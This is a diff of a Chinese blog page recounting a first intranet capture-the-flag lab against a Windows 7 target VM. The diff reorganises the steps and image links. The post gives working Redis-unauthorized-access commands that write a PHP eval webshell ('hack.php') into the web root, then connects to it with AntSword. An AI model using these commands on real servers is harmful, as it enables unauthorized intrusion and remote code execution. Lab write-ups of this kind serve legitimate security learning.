@@ -124,7 +124,7 @@
     <div class="article-entry" itemprop="articleBody">
        
   <hr>
-<p>title：第一次内网靶场渗透<br>data：2023.03.16 20：00：00<br>tage：’’</p>
+<p>title：第一次内网靶场渗透<br>data：2023.03.16 20：00：00<br>tage：</p>
 <hr>
 <p>第一次接触到内网这一块，刚好最近新搭了博客。</p>
 <p>因为是在本地开的虚拟机，所以通过扫自己的c段找到网站。</p>
@@ -132,15 +132,13 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/phpmyadmin      </span><br><span class="line"></span><br><span class="line">/flag.php           </span><br><span class="line"></span><br><span class="line">/.gitignore</span><br></pre></td></tr></table></figure>
 
 <p>&#x2F;.gitignore可以得到第一个flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/x1n-yan/myblog@master/img/202303171844975.png" alt="image-20230317184413926"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/x1n-yan/myblog@master/img/202303171837077.png" alt="image-20230317183700016"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/x1n-yan/myblog/main/img/202303161210471.png" alt="image-20230316121012442"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/x1n-yan/myblog@master/img/202303171843171.png" alt="image-20230317184344142"></p>
 <p>看见一个会员登入的地方和要会员才可以看见的flag，但是这里因为靶场的问题，验证码显示不出来，不能用弱口令登入，不过这是一个windows7的靶机，可以用端口的漏洞getshell。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/x1n-yan/myblog/main/img/202303171207678.png" alt="image-20230317120704068"></p>
 <p>nmap扫出来很多端口，这里用的是6379的redis未授权，这里没有扫出来</p>
-<p>先redis-cli -h url -p 6379</p>
-<p>然后config set dir C:&#x2F;phpstudy_pro&#x2F;WWW设置路径，路径地址可以从之前dirsearch扫出来的一个flag.php爆出的错得到</p>
-<p><img src="https://cdn.jsdelivr.net/gh/x1n-yan/myblog/main/img/202303171228108.png" alt="image-20230317122813085"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">config set dbfilename hack.php<span class="comment">//设置文件名</span></span><br><span class="line"></span><br><span class="line">set x <span class="string">&quot;&lt;?php @eval(<span class="subst">$_POST</span>[&#x27;1&#x27;]);?&gt;&quot;</span><span class="comment">//写入一句话</span></span><br><span class="line"></span><br><span class="line">最后save保存</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">先redis-cli -h url -p <span class="number">6379</span></span><br><span class="line"></span><br><span class="line">config set dir C:/phpstudy_pro/WWW<span class="comment">//设置路径，路径地址可以从之前dirsearch扫出来的一个flag.php爆出的错得到</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">config set dbfilename hack.php<span class="comment">//设置文件名</span></span><br><span class="line"></span><br><span class="line">set x <span class="string">&quot;&lt;?php @eval(<span class="subst">$_POST</span>[&#x27;1&#x27;]);?&gt;&quot;</span><span class="comment">//写入一句话</span></span><br><span class="line"></span><br><span class="line">save<span class="comment">//保存</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/x1n-yan/myblog/main/img/202303171213245.png" alt="image-20230317121337225"></p>
 <p>就可以用蚁剑成功连接了</p>
